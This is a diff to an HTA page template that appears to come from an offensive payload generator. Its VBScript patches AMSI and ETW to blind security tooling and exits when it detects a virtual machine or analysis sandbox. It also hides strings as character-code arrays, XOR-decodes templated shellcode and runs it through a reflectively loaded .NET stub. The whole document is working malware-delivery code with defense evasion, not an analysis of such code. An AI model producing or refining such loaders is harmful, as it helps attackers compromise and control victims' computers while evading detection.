@@ -13,52 +13,78 @@
 </head>
 <body>
 <script language="VBScript">
-Sub {{ v.sub_amsi }}()
+Function {{ v.fn_build_str }}(a)
+    Dim s, i: s = ""
+    For i = 0 To UBound(a): s = s & Chr(a(i)): Next
+    {{ v.fn_build_str }} = s
+End Function
+
+Sub {{ v.fn_amsi }}()
     On Error Resume Next
-    Dim asm
-    Set asm = CreateObject("System.Reflection.Assembly")
-    Dim amsi
-    Set amsi = asm.GetType("System.Management.Automation.AmsiUtils")
-    If Not amsi Is Nothing Then
-        amsi.GetField("amsiInitFailed", 36).SetValue Nothing, True
+    Dim asm: Set asm = CreateObject("System.Reflection.Assembly")
+    Dim amsiT: Set amsiT = asm.GetType({{ v.fn_build_str }}(Array({{ v.jsc_auto_amsi_utils }})))
+    If Not amsiT Is Nothing Then
+        amsiT.GetField({{ v.fn_build_str }}(Array({{ v.jsc_amsi_init_fail }})), 36).SetValue Nothing, True
     End If
 End Sub
 
+Sub {{ v.fn_etw }}()
+    On Error Resume Next
+    Dim asm: Set asm = CreateObject("System.Reflection.Assembly")
+    Dim t: Set t = asm.GetType({{ v.fn_build_str }}(Array({{ v.jsc_eventing_ep }})))
+    If Not t Is Nothing Then
+        Dim fi: Set fi = t.GetField({{ v.fn_build_str }}(Array({{ v.jsc_m_enabled }})), 36)
+        If Not fi Is Nothing Then fi.SetValue Nothing, 0
+    End If
+End Sub
+
+Function {{ v.fn_sandbox }}()
+    {{ v.fn_sandbox }} = False
+    On Error Resume Next
+    If Screen.Width < 800 Or Screen.Height < 600 Then {{ v.fn_sandbox }} = True: Exit Function
+    Dim wmi: Set wmi = GetObject("winmgmts:")
+    Dim procs: Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process")
+    Dim badList: badList = Array("vmtoolsd.exe","vboxservice.exe","cuckoo.exe","qemu-ga.exe")
+    Dim p, j
+    For Each p In procs
+        Dim pn: pn = LCase(p.Name)
+        For j = 0 To UBound(badList)
+            If pn = badList(j) Then {{ v.fn_sandbox }} = True: Exit Function
+        Next
+    Next
+End Function
+
 Sub {{ v.sub_run }}()
-    Call {{ v.sub_amsi }}()
+    If {{ v.fn_sandbox }}() Then self.close: Exit Sub
+    Call {{ v.fn_amsi }}()
+    Call {{ v.fn_etw }}()
 
     Dim sc_hex, key_hex
     sc_hex  = "{{ shellcode_hex }}"
     key_hex = "{{ key_hex }}"
 
-    Dim sc()
+    Dim sc(), i
     ReDim sc(Len(sc_hex) / 2 - 1)
-    Dim i
     For i = 0 To Len(sc_hex) / 2 - 1
         sc(i) = CInt("&H" & Mid(sc_hex, i * 2 + 1, 2)) Xor _
                 CInt("&H" & Mid(key_hex, (i Mod (Len(key_hex) / 2)) * 2 + 1, 2))
     Next
 
-    ' Load .NET stub and invoke
-    Dim asm, loader
-    Set loader = CreateObject("System.Reflection.Assembly")
-    Dim stub_hex
-    stub_hex = "{{ v.dotnet_stub_hex }}"
-    Dim stub_bytes()
-    ReDim stub_bytes(Len(stub_hex) / 2 - 1)
+    Dim loader: Set loader = CreateObject("System.Reflection.Assembly")
+    Dim stub_hex: stub_hex = "{{ v.dotnet_stub_hex }}"
+    Dim stub_bytes(): ReDim stub_bytes(Len(stub_hex) / 2 - 1)
     For i = 0 To Len(stub_hex) / 2 - 1
         stub_bytes(i) = CInt("&H" & Mid(stub_hex, i * 2 + 1, 2))
     Next
 
-    Set asm = loader.Load((stub_bytes))
-    Dim t, mi
-    Set t  = asm.GetType("Stub.Loader")
-    Set mi = t.GetMethod("Run")
+    Dim asm: Set asm = loader.Load((stub_bytes))
+    Dim t:   Set t   = asm.GetType("Stub.Loader")
+    Dim mi:  Set mi  = t.GetMethod("Run")
     mi.Invoke Nothing, Array((sc))
+    self.close
 End Sub
 
 Call {{ v.sub_run }}()
-self.close
 </script>
 </body>
 </html>
